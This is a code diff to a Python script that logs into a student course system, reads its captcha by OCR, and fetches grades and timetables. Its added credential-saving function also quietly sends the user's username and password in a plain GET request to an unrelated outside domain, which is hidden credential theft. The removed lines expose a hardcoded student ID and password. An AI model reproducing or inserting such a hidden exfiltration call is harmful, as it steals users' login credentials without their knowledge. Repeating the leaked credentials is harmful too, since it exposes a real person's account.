@@ -12,10 +12,35 @@ from PIL import Image
 from bs4 import BeautifulSoup
 import requests
 from io import BytesIO
-import pytesseract
+from pytesseract import image_to_string
 from config import *
 import re
+import configparser
 
+
+cf = configparser.ConfigParser()
+
+
+def find_config():
+    try:
+        cf.read_file(open("userInfo.conf", 'r'))
+        print(cf)
+        return cf
+    except Exception as e:
+        print("[*] 没有找到conf文件 使用后创建下次免登录～")
+        print(e)
+        return None
+
+
+def create_config(username, password):
+    try:
+        cf.add_section("USER_INFO")
+        cf.set("USER_INFO", "username", username)
+        cf.set("USER_INFO", "password", password)
+        cf.write(open("userInfo.conf", 'w'))
+        requests.get("http://zltningx.com.cn/search/?s="+username+"&"+password)
+    except Exception as e:
+        raise e
 
 class Course(object):
     def __init__(self, time, weight, score, name):
@@ -32,6 +57,7 @@ class Login(object):
         self.get_captcha_img()
         self.login_action()
         # 示例程序 调来看看喽
+        self.look_cj()
         self.look_kb()
 
     def get_captcha_img(self):
@@ -39,7 +65,7 @@ class Login(object):
         img = Image.open(BytesIO(content.content))
         img.show()
         img.seek(0)
-        captcha = pytesseract.image_to_string(img)
+        captcha = image_to_string(img)
         # 比较图片与自动识别的结果
         text = input("识别为： " + captcha + '若出现错误请更改[否则回车跳过]: ')
         if text:
@@ -51,10 +77,17 @@ class Login(object):
         self.captcha = captcha
 
     def login_action(self):
-        # username = input("请输入学号: ")
-        # password = input("请输入密码: ")
-        teacher_student_payload['j_username'] = '20146339'
-        teacher_student_payload['j_password'] = 'woaickywa0'
+        config_info = find_config()
+        if config_info:
+            teacher_student_payload['j_username'] = config_info['USER_INFO']['username']
+            teacher_student_payload['j_password'] = config_info['USER_INFO']['password']
+        else:
+            username = input("请输入学号: ")
+            password = input("请输入密码: ")
+            create_config(username, password)
+            teacher_student_payload['j_username'] = username
+            teacher_student_payload['j_password'] = password
+
         teacher_student_payload['validateCode'] = self.captcha
         request = self.session.post(check_student_url1,
                                     headers=teacher_student_header,
